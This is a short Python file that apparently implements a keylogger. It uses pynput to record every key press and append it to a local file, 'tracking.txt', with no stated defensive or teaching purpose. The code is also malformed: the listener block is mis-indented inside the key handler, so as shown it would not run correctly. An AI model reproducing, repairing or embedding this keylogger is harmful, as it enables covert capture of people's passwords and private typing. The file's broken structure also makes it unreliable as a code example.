from pynput.keyboard import Listener,Key



def from_keyboard_to_file(key):

    try:
        key = key.char
    except AttributeError:
        if key == Key.space:
          key = ' '
        if key == Key.enter:
            key = '\n'



    key_data = str(key)
    key_data = key_data.replace("'", " ")

    with open("tracking.txt","a") as the_file:
        the_file.write(key_data)

     with Listener (on_press = from_keyboard_to_file) as l:
         l.join()

